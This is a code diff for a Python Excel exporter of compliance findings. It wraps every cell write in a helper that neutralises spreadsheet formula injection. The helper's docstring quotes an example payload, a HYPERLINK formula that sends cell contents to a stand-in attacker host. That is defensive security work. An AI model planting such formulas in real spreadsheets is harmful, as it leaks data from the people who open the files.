@@ -19,8 +19,21 @@ from openpyxl.worksheet.worksheet import Worksheet
 from sqlalchemy.orm import Session
 
 from warlock.utils import ensure_aware
+from warlock.utils.csv_safety import neutralize_csv_value
 
 log = logging.getLogger(__name__)
+
+
+def _set_cell(ws: Worksheet, *, row: int, column: int, value: Any) -> Any:
+    """Write ``value`` to a cell after neutralising spreadsheet formula prefixes.
+
+    SEC-C11: openpyxl writes strings verbatim — including formulas. A finding
+    title of ``=HYPERLINK("http://attacker/?d="&A1,"click")`` is rendered as
+    a live formula and runs the moment the auditor opens the file. The
+    scrubber prefixes ``=/+/-/@/\\t/\\r``-leading strings with ``'``.
+    """
+    return ws.cell(row=row, column=column, value=neutralize_csv_value(value))
+
 
 # ---------------------------------------------------------------------------
 # Shared styles
@@ -229,19 +242,19 @@ class ExcelExporter:
         _apply_headers(ws, headers)
 
         for row_idx, f in enumerate(findings, 2):
-            ws.cell(row=row_idx, column=1, value=f.id)
-            ws.cell(row=row_idx, column=2, value=f.title)
-            ws.cell(row=row_idx, column=3, value=f.observation_type)
-            ws.cell(row=row_idx, column=4, value=f.severity)
-            ws.cell(row=row_idx, column=5, value=f.source)
-            ws.cell(row=row_idx, column=6, value=f.provider)
-            ws.cell(row=row_idx, column=7, value=f.resource_id or "")
-            ws.cell(row=row_idx, column=8, value=f.resource_type or "")
-            ws.cell(row=row_idx, column=9, value=f.account_id or "")
-            ws.cell(row=row_idx, column=10, value=f.region or "")
-            ws.cell(row=row_idx, column=11, value=_iso_str(f.observed_at))
-            ws.cell(row=row_idx, column=12, value=_iso_str(f.ingested_at))
-            ws.cell(row=row_idx, column=13, value=f.sha256)
+            _set_cell(ws, row=row_idx, column=1, value=f.id)
+            _set_cell(ws, row=row_idx, column=2, value=f.title)
+            _set_cell(ws, row=row_idx, column=3, value=f.observation_type)
+            _set_cell(ws, row=row_idx, column=4, value=f.severity)
+            _set_cell(ws, row=row_idx, column=5, value=f.source)
+            _set_cell(ws, row=row_idx, column=6, value=f.provider)
+            _set_cell(ws, row=row_idx, column=7, value=f.resource_id or "")
+            _set_cell(ws, row=row_idx, column=8, value=f.resource_type or "")
+            _set_cell(ws, row=row_idx, column=9, value=f.account_id or "")
+            _set_cell(ws, row=row_idx, column=10, value=f.region or "")
+            _set_cell(ws, row=row_idx, column=11, value=_iso_str(f.observed_at))
+            _set_cell(ws, row=row_idx, column=12, value=_iso_str(f.ingested_at))
+            _set_cell(ws, row=row_idx, column=13, value=f.sha256)
 
         max_row = len(findings) + 1
         if max_row > 1:
@@ -300,22 +313,22 @@ class ExcelExporter:
         _apply_headers(ws, headers)
 
         for row_idx, cr in enumerate(results, 2):
-            ws.cell(row=row_idx, column=1, value=cr.id)
-            ws.cell(row=row_idx, column=2, value=cr.framework)
-            ws.cell(row=row_idx, column=3, value=cr.control_id)
-            ws.cell(row=row_idx, column=4, value=cr.status)
-            ws.cell(row=row_idx, column=5, value=cr.severity)
-            ws.cell(row=row_idx, column=6, value=cr.assertion_name or "")
+            _set_cell(ws, row=row_idx, column=1, value=cr.id)
+            _set_cell(ws, row=row_idx, column=2, value=cr.framework)
+            _set_cell(ws, row=row_idx, column=3, value=cr.control_id)
+            _set_cell(ws, row=row_idx, column=4, value=cr.status)
+            _set_cell(ws, row=row_idx, column=5, value=cr.severity)
+            _set_cell(ws, row=row_idx, column=6, value=cr.assertion_name or "")
             ws.cell(
                 row=row_idx,
                 column=7,
                 value=str(cr.assertion_passed) if cr.assertion_passed is not None else "",
             )
-            ws.cell(row=row_idx, column=8, value=cr.ai_confidence)
-            ws.cell(row=row_idx, column=9, value=cr.ai_model or "")
-            ws.cell(row=row_idx, column=10, value=cr.assessor)
-            ws.cell(row=row_idx, column=11, value=_iso_str(cr.assessed_at))
-            ws.cell(row=row_idx, column=12, value=cr.remediation_summary or "")
+            _set_cell(ws, row=row_idx, column=8, value=cr.ai_confidence)
+            _set_cell(ws, row=row_idx, column=9, value=cr.ai_model or "")
+            _set_cell(ws, row=row_idx, column=10, value=cr.assessor)
+            _set_cell(ws, row=row_idx, column=11, value=_iso_str(cr.assessed_at))
+            _set_cell(ws, row=row_idx, column=12, value=cr.remediation_summary or "")
 
         max_row = len(results) + 1
         if max_row > 1:
@@ -378,23 +391,23 @@ class ExcelExporter:
         _apply_headers(ws, headers)
 
         for row_idx, p in enumerate(poams, 2):
-            ws.cell(row=row_idx, column=1, value=p.id)
-            ws.cell(row=row_idx, column=2, value=p.framework)
-            ws.cell(row=row_idx, column=3, value=p.control_id)
-            ws.cell(row=row_idx, column=4, value=p.weakness_description)
-            ws.cell(row=row_idx, column=5, value=p.severity)
-            ws.cell(row=row_idx, column=6, value=p.risk_level or "")
-            ws.cell(row=row_idx, column=7, value=p.status)
-            ws.cell(row=row_idx, column=8, value=_iso_str(p.scheduled_completion))
-            ws.cell(row=row_idx, column=9, value=_iso_str(p.actual_completion))
-            cost_cell = ws.cell(row=row_idx, column=10, value=p.cost_estimate)
+            _set_cell(ws, row=row_idx, column=1, value=p.id)
+            _set_cell(ws, row=row_idx, column=2, value=p.framework)
+            _set_cell(ws, row=row_idx, column=3, value=p.control_id)
+            _set_cell(ws, row=row_idx, column=4, value=p.weakness_description)
+            _set_cell(ws, row=row_idx, column=5, value=p.severity)
+            _set_cell(ws, row=row_idx, column=6, value=p.risk_level or "")
+            _set_cell(ws, row=row_idx, column=7, value=p.status)
+            _set_cell(ws, row=row_idx, column=8, value=_iso_str(p.scheduled_completion))
+            _set_cell(ws, row=row_idx, column=9, value=_iso_str(p.actual_completion))
+            cost_cell = _set_cell(ws, row=row_idx, column=10, value=p.cost_estimate)
             if p.cost_estimate is not None:
                 cost_cell.number_format = _CURRENCY_FORMAT
-            ws.cell(row=row_idx, column=11, value=p.resource_allocation or "")
-            ws.cell(row=row_idx, column=12, value=p.escalation_level or 0)
-            ws.cell(row=row_idx, column=13, value=p.created_by or "")
-            ws.cell(row=row_idx, column=14, value=p.approved_by or "")
-            ws.cell(row=row_idx, column=15, value=_iso_str(p.created_at))
+            _set_cell(ws, row=row_idx, column=11, value=p.resource_allocation or "")
+            _set_cell(ws, row=row_idx, column=12, value=p.escalation_level or 0)
+            _set_cell(ws, row=row_idx, column=13, value=p.created_by or "")
+            _set_cell(ws, row=row_idx, column=14, value=p.approved_by or "")
+            _set_cell(ws, row=row_idx, column=15, value=_iso_str(p.created_at))
 
         max_row = len(poams) + 1
         if max_row > 1:
@@ -487,20 +500,20 @@ class ExcelExporter:
         _apply_headers(ws, headers)
 
         for row_idx, r in enumerate(risks, 2):
-            ws.cell(row=row_idx, column=1, value=r.id)
-            ws.cell(row=row_idx, column=2, value=r.framework)
-            ws.cell(row=row_idx, column=3, value=r.scenario_name)
-            ale_cell = ws.cell(row=row_idx, column=4, value=r.mean_ale)
+            _set_cell(ws, row=row_idx, column=1, value=r.id)
+            _set_cell(ws, row=row_idx, column=2, value=r.framework)
+            _set_cell(ws, row=row_idx, column=3, value=r.scenario_name)
+            ale_cell = _set_cell(ws, row=row_idx, column=4, value=r.mean_ale)
             ale_cell.number_format = _CURRENCY_FORMAT
-            var95_cell = ws.cell(row=row_idx, column=5, value=r.var_95)
+            var95_cell = _set_cell(ws, row=row_idx, column=5, value=r.var_95)
             var95_cell.number_format = _CURRENCY_FORMAT
-            var99_cell = ws.cell(row=row_idx, column=6, value=r.var_99)
+            var99_cell = _set_cell(ws, row=row_idx, column=6, value=r.var_99)
             var99_cell.number_format = _CURRENCY_FORMAT
-            ws.cell(row=row_idx, column=7, value=r.control_effectiveness)
-            ws.cell(row=row_idx, column=8, value=r.iterations)
-            ws.cell(row=row_idx, column=9, value=r.risk_culture_score)
-            ws.cell(row=row_idx, column=10, value=r.mttr_days)
-            ws.cell(row=row_idx, column=11, value=_iso_str(r.created_at))
+            _set_cell(ws, row=row_idx, column=7, value=r.control_effectiveness)
+            _set_cell(ws, row=row_idx, column=8, value=r.iterations)
+            _set_cell(ws, row=row_idx, column=9, value=r.risk_culture_score)
+            _set_cell(ws, row=row_idx, column=10, value=r.mttr_days)
+            _set_cell(ws, row=row_idx, column=11, value=_iso_str(r.created_at))
 
         _auto_width(ws)
         max_row = len(risks) + 1
@@ -550,7 +563,7 @@ class ExcelExporter:
                     value = _iso_str(value)
                 elif isinstance(value, (list, dict)):
                     value = str(value)
-                ws.cell(row=row_idx, column=col_idx, value=value)
+                _set_cell(ws, row=row_idx, column=col_idx, value=value)
 
         _auto_width(ws)
         max_row = len(data) + 1
